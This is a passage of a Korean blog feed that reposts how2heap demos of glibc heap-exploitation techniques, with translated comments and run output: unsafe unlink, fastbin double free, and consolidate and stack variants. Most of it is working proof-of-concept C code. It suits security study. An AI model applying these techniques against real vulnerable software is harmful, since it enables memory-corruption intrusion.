      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04/16.04 64bit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"global chunk0_ptr: %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"corrupt할 victim chunk: %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 fake chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\n"</span></span><br><span class="line"><span class="string">"그러나 이것은 새로운 값이다: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\n"</span></span><br><span class="line"><span class="string">"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"원래 값: %s\n"</span>,victim_string);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------chunk0_ptr[0]=0x4141414142424242LL-------"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 값: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[unsafe_unlink.c]</small></center><p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt></p><p><code>unsafe unlink 2.0!</code><br><code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br>이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br>대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br>이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.</p><p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br><code>corrupt할 victim chunk: 0x6030a0</code></p><p>chunk0에 fake chunk를 생성한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br>이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br><code>Fake chunk fd: 0x602058</code><br><code>Fake chunk bk: 0x602060</code></p><p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br>chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br>fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br>만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br>그러나 이것은 새로운 값이다: <code>0x80</code><br>chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.</p><p>이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다</p><p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br>chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br><code>원래 값: Hello!~</code><br><code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br><code>바뀐 값: BBBBAAAA</code></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_consolidate</title>
      <link>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</guid>
      <pubDate>Tue, 28 May 2019 05:15:29 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_consolidatec&quot;&gt;&lt;a
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_consolidatec"><a class="markdownIt-Anchor" href="#fastbin_dup_into_consolidatec"></a> fastbin_dup_into_consolidate.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fastbin을 두개 할당한다: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()를 trigger하기 위해 largebin을 할당한다: p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()에서 p1은 unsorted bin으로 이동한다.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"double free 취약점을 trigger한다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p1이 fast-top에 있지 않기 때문에 malloc의 체크를 통과할 수 있다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 p1은 unsorted bin과 fastbin 안에 있다.\n"</span></span><br><span class="line">  <span class="string">"그래서 우리는 주소를 2번 얻을 수 있다: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_consolidate.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58452763-7cf1c980-8153-11e9-92de-1a7cd4eb43bd.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_stack</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</guid>
      <pubDate>Mon, 27 May 2019 12:36:51 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_stackc&quot;&gt;&lt;a class
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span></span><br><span class="line"><span class="string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span></span><br><span class="line"><span class="string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span></span><br><span class="line"><span class="string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span></span><br><span class="line"><span class="string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span></span><br><span class="line"><span class="string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58422108-b4696300-80cc-11e9-9c6f-31db09f069bb.png"></p><center><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">Source</a></strong></p></center><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</guid>
      <pubDate>Mon, 27 May 2019 10:31:21 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dupc&quot;&gt;&lt;a class=&quot;markdownI
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dupc"><a class="markdownIt-Anchor" href="#fastbin_dupc"></a> fastbin_dup.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// a를 한번 더 free하면 에러가 발생한다.(free list의 top에 위치하고 있기 때문)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// 이제 free list의 최상단에서 벗어났으니 free(a)가 가능하다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span>, a, b, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 세 번 하면, malloc a(8)를 두번 할당할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" 